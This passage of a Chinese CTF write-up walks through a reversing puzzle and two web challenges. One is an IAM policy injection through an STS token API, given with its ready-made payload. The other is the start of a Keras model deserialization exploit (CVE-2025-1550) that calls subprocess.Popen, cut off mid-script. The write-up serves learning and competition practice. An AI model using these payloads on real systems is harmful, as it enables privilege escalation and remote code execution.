== <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">LOBYTE</span>(a21) = *(_BYTE *)(v36 + <span class="number">1</span>);</span><br><span class="line">          <span class="built_in">JUMPOUT</span>(<span class="number">0x401FB0LL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sub_4021D0</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sub_402264</span>(..);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_402214</span>(*(<span class="type">unsigned</span> __int8 *)(v34 + <span class="number">56</span>), off_59FB28[<span class="number">0</span>], v26, v27, v28, v29, v30, v31);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_4022B4</span>(v33, off_59FB28[<span class="number">0</span>], v26, v27, v28, v29, v30, v31);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_401FE8</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//...</span></span><br><span class="line">  <span class="built_in">sub_4CD9C0</span>(a1, <span class="number">19LL</span>);</span><br><span class="line">  v49 = ((__int64 (__fastcall *)(__int64, __int64, __int64))loc_401D00)(v48, v45, v46);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)a14 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_40228C</span>(v49);</span><br><span class="line">  v51 = (<span class="type">int</span>)a14;</span><br><span class="line">  v52 = <span class="number">0LL</span>;</span><br><span class="line">  v53 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">LODWORD</span>(v54) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v56 = (*(_BYTE *)(v45 + i - <span class="number">1</span>) &amp; <span class="number">0x7F</span>) &lt;&lt; v54;</span><br><span class="line">    v54 = (<span class="type">unsigned</span> <span class="type">int</span>)(v54 + <span class="number">7</span>);</span><br><span class="line">    v53 |= v56;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_BYTE *)(v45 + i - <span class="number">1</span>) &amp; <span class="number">0x80</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)&amp;a23 + (<span class="type">int</span>)v52) = v53;</span><br><span class="line">      v52 = (<span class="type">unsigned</span> <span class="type">int</span>)(v52 + <span class="number">1</span>);</span><br><span class="line">      v54 = <span class="number">0LL</span>;</span><br><span class="line">      v53 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i == (<span class="type">int</span>)a14 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v57 = &amp;unk_5A1000;</span><br><span class="line">  v58 = &amp;dword_5A1B80[<span class="number">24</span>];</span><br><span class="line">  *(_OWORD *)&amp;dword_5A1B80[<span class="number">24</span>] = a23;</span><br><span class="line">  *(_OWORD *)&amp;dword_5A1B80[<span class="number">28</span>] = a24;</span><br><span class="line">  *(_OWORD *)&amp;dword_5A1B80[<span class="number">32</span>] = a25;</span><br><span class="line">  *(_OWORD *)&amp;dword_5A1B80[<span class="number">36</span>] = a26;</span><br><span class="line">  *(_OWORD *)&amp;dword_5A1B80[<span class="number">40</span>] = a27;</span><br><span class="line">  <span class="built_in">LOBYTE</span>(dword_5A1B80[<span class="number">44</span>]) = a28;</span><br><span class="line">  v59 = dword_5A1B80;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j != <span class="number">81</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v61 = (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)dword_5A1B80 + j);</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)dword_5A1B80 + j) )</span><br><span class="line">    &#123;</span><br><span class="line">      v54 = (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)&amp;dword_5A1B80[<span class="number">24</span>] + j);</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)v54 != (_DWORD)v61 )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sub_402294</span>(dword_5A1B80);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v62 = (<span class="type">char</span> *)&amp;byte_5A1B20;</span><br><span class="line">  v63 = <span class="number">1</span>;</span><br><span class="line">  v64 = &amp;dword_5A1B80[<span class="number">24</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0LL</span>; k != <span class="number">9</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      v66 = *((<span class="type">char</span> *)v64 + k);</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)v64 + k) )</span><br><span class="line">      &#123;</span><br><span class="line">        v67 = v62[k];</span><br><span class="line">        <span class="keyword">if</span> ( (v67 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v59 = (_DWORD *)<span class="built_in">sub_401BD0</span>(v47, (<span class="type">unsigned</span> <span class="type">int</span>)k, v66, &amp;dword_5A1B80[<span class="number">24</span>]);</span><br><span class="line">          <span class="keyword">if</span> ( v66 != (_DWORD)v59 )</span><br><span class="line">            v63 = v67;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v47;</span><br><span class="line">    v62 += <span class="number">9</span>;</span><br><span class="line">    v64 = (_DWORD *)((<span class="type">char</span> *)v64 + <span class="number">9</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v47 != <span class="number">9</span> );</span><br><span class="line">  <span class="keyword">if</span> ( (v63 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Alice] Wow! You&#x27;re really smart! &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Alice] As a reward, I&#x27;ll give you a little flag~&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Alice] D3CTF&#123;replace_with_md5_inside&#125;&quot;</span>);</span><br><span class="line">    <span class="built_in">JUMPOUT</span>(<span class="number">0x402154LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_4021F8</span>(..);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个函数首先做了Leb128解码操作，从byte_5A0040还原出puzzle</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x80</span>, <span class="number">0x8C</span>, <span class="number">0x80</span>, <span class="number">0x30</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x0C</span>, <span class="number">0x82</span>, <span class="number">0x08</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x86</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x20</span>, <span class="number">0x84</span>, <span class="number">0x86</span>, <span class="number">0x18</span>, <span class="number">0x80</span>, <span class="number">0x84</span>, <span class="number">0x18</span>, <span class="number">0x86</span>, <span class="number">0x0C</span>, <span class="number">0x80</span>, <span class="number">0x8E</span>, <span class="number">0x1C</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x94</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x20</span>, <span class="number">0x87</span>, <span class="number">0x80</span>, <span class="number">0x98</span>, <span class="number">0x18</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x94</span>, <span class="number">0x30</span>, <span class="number">0x86</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x86</span>, <span class="number">0x80</span>, <span class="number">0x18</span>, <span class="number">0x80</span>, <span class="number">0x8C</span>, <span class="number">0x20</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x18</span>, <span class="number">0x08</span>]</span><br><span class="line">v23, v24 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    v25 = (s[i] &amp; <span class="number">0x7f</span>) &lt;&lt; v24</span><br><span class="line">    v24 += <span class="number">7</span></span><br><span class="line">    v23 |= v25</span><br><span class="line">    <span class="keyword">if</span> s[i] &amp; <span class="number">0x80</span> == <span class="number">0</span>:</span><br><span class="line">        c.<span class="built_in">append</span>(v23)</span><br><span class="line">        v24 = <span class="number">0</span></span><br><span class="line">        v23 = <span class="number">0</span></span><br><span class="line">c = list(b<span class="string">&quot;&quot;</span>.join([i.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> i in c]))</span><br><span class="line"><span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j in <span class="keyword">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="built_in">print</span>(c[i*<span class="number">9</span>+j], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>

<p>按照后面第二个函数取了9*9 81个数进行打印，得到了一个像迷宫、扫雷、数独。。。的东西</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">060600020</span><br><span class="line">030240001</span><br><span class="line">006004436</span><br><span class="line">002606600</span><br><span class="line">077000580</span><br><span class="line">004706300</span><br><span class="line"><span class="number">566600000</span></span><br><span class="line">060600680</span><br><span class="line">000200608</span><br></pre></td></tr></table></figure>

<p>最后分析sub_401BD0函数，它是一个递归遍历的逻辑，gpt分析了下发现和连通图有关系，就是检查一个数字x要保证该数字相接的数字里有x个x，大概手算了下正好81个数填满，所以直接先手动填充了一些比较好确认的数如8、7、2等，然后gpt分析直接给出唯一解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">366666622</span></span><br><span class="line"><span class="number">332244331</span></span><br><span class="line"><span class="number">666654436</span></span><br><span class="line"><span class="number">622656666</span></span><br><span class="line"><span class="number">477755586</span></span><br><span class="line"><span class="number">444776388</span></span><br><span class="line"><span class="number">566676338</span></span><br><span class="line"><span class="number">566676688</span></span><br><span class="line"><span class="number">555226688</span></span><br></pre></td></tr></table></figure>

<p>接下来要逆向还原输入，首先输入做了一个逆向字符串，然后字符串转为hex值，然后做了LEB128解码得到最终比较字符串，只需逆向逻辑即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode_uleb128</span>(<span class="params">value: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    按照 LEB128/VLQ 规则，把一个无符号整数编码为若干字节。</span></span><br><span class="line"><span class="string">    - 每次取最低 7 位放入一个字节的低 7 位，高位（0x80）表示后面还有字节。</span></span><br><span class="line"><span class="string">    - 直到 value 变为 0 为止，且最后一个字节的高位不置 1。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        byte = value &amp; <span class="number">0x7F</span></span><br><span class="line">        value &gt;&gt;= <span class="number">7</span></span><br><span class="line">        <span class="keyword">if</span> value != <span class="number">0</span>:    <span class="comment"># 如果 value 还没耗尽，就把这一位的高位设成 1，表示“后续还有更多字节”</span></span><br><span class="line">            byte |= <span class="number">0x80</span></span><br><span class="line">        result.append(byte)</span><br><span class="line">        <span class="keyword">if</span> value == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;366666622332244331666654436622656666477755586444776388566676338566676688555226688&quot;</span></span><br><span class="line">b = <span class="string">b&quot;&quot;</span>.join(<span class="built_in">bytes</span>([<span class="built_in">int</span>(i)]) <span class="keyword">for</span> i <span class="keyword">in</span> s)</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b), <span class="number">4</span>):</span><br><span class="line">    c.append(<span class="built_in">int</span>.from_bytes(b[i:i+<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">final = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    final += encode_uleb128(i)</span><br><span class="line"><span class="built_in">print</span>(final.<span class="built_in">hex</span>()[::-<span class="number">1</span>])    <span class="comment"># 800489c8280149a858040ac8688389c868820a683803c9c868034909888189e878020988680449a85883c9e8480389c86882894828038968480249c868038928388109882801c868280189c8680389c838</span></span><br></pre></td></tr></table></figure>

<p>得到的结果做md5加密即为flag d3ctf{a6410f9a866c52763c11bce9fb8b06ca}</p>
<h1><span id="web">Web</span><a href="#web" class="header-anchor"></a></h1><h2><span id="d3invitation">D3Invitation</span><a href="#d3invitation" class="header-anchor"></a></h2><p>这道题本质是一个针对签发的 STS token 具有的 Policy 进行注入的过程，在 API </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST  /api/genSTSCreds </span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;object_name&quot;: &quot;injection point&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>中通过 参数 object_name 进行注入</p>
<p>例如</p>
<p>我们可以使 object_name  为 * ，</p>
<p>此时 STSToken （JWT）中的 payload 部分的 policy decode base64 后，可以得到签发的 policy 为 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;Version&quot;:&quot;2012-10-17&quot;,&quot;Statement&quot;:[&#123;&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:[&quot;s3:GetObject&quot;,&quot;s3:PutObject&quot;],&quot;Resource&quot;:[&quot;arn:aws:s3:::d3invitation/*&quot;]&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>也就是我们现在签发的 AKSKSTS 具有的权限为 对 Bucket D3invtation 上传或获取文件</p>
<p>由于没有进行转义和过滤，那么我们可以注入 payload</p>
<p>使得最后的 payload  形如</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span> <span class="string">&quot;s3:PutObject&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;arn:aws:s3:::d3invitation/*&quot;</span><span class="punctuation">,</span> <span class="string">&quot;arn:aws:s3:::flag/*&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;arn:aws:s3:::d3invitation&quot;</span><span class="punctuation">,</span> <span class="string">&quot;arn:aws:s3:::flag&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;s3:ListAllMyBuckets&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;*&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>简单的计算后，可以得到注入内容为（也就是 object name）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*<span class="string">&quot;,&quot;</span>arn:aws:s3:::flag/*<span class="string">&quot;]&#125;,&#123;&quot;</span>Effect<span class="string">&quot;:&quot;</span>Allow<span class="string">&quot;,&quot;</span>Action<span class="string">&quot;:[&quot;</span>s3:ListBucket<span class="string">&quot;],&quot;</span>Resource<span class="string">&quot;:[&quot;</span>arn:aws:s3:::d3invitation<span class="string">&quot;,&quot;</span>arn:aws:s3:::flag<span class="string">&quot;]&#125;,&#123;&quot;</span>Effect<span class="string">&quot;:&quot;</span>Allow<span class="string">&quot;,&quot;</span>Action<span class="string">&quot;:[&quot;</span>s3:ListAllMyBuckets<span class="string">&quot;],&quot;</span>Resource<span class="string">&quot;:[&quot;</span>*</span><br></pre></td></tr></table></figure>

<p>此时得到的 aksksts 后 使用 aws s3 进行利用</p>
<p>可以知道 flag 存放在 flag 桶的 &#x2F;flag object 中</p>
<h2><span id="d3model">d3model</span><a href="#d3model" class="header-anchor"></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_model</span>(<span class="params">modelname</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        keras.models.load_model(modelname)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No file part&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No selected file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    MAX_FILE_SIZE = <span class="number">50</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 50MB</span></span><br><span class="line">    file.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">    file_size = file.tell()</span><br><span class="line">    file.seek(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;File size exceeds 50MB limit&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;test.keras&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        os.remove(filepath)</span><br><span class="line">    file.save(filepath)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is_valid_model(filepath):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Model is valid&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid model file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>很明显，最开始我们可以进行反序列化RCE，文章 <a href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models%EF%BC%8C">https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models，</a>  python的话比较好处理，我们并不知道是否出网，所以直接覆盖HTMl文件的内容即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">model_name=<span class="string">&quot;model.keras&quot;</span></span><br><span class="line"></span><br><span class="line">x_train = np.random.rand(<span class="number">100</span>, <span class="number">28</span>*<span class="number">28</span>)  </span><br><span class="line">y_train = np.random.rand(<span class="number">100</span>) </span><br><span class="line"></span><br><span class="line">model = Sequential([Dense(<span class="number">1</span>, activation=<span class="string">&#x27;linear&#x27;</span>, input_dim=<span class="number">28</span>*<span class="number">28</span>)])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>, loss=<span class="string">&#x27;mse&#x27;</span>)</span><br><span class="line">model.fit(x_train, y_train, epochs=<span class="number">5</span>)</span><br><span class="line">model.save(model_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    config=json.loads(f.read(<span class="string">&quot;config.json&quot;</span>).decode())</span><br><span class="line">    </span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;module&quot;</span>]=<span class="string">&quot;keras.models&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;class_name&quot;</span>]=<span class="string">&quot;Model&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;config&quot;</span>]=&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>:<span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;layers&quot;</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>:<span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;class_name&quot;</span>:<span class="string">&quot;function&quot;</span>,</span><br><span class="line">            <span class="string">&quot;config&quot;</span>:<span class="string">&quot;Popen&quot;</span>,</span><br><span class="line">            <span class="string">&quot;module&quot;</span>: <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">            <span class="string">&quot;inbound_nodes&quot;</span>:[&#123;<span 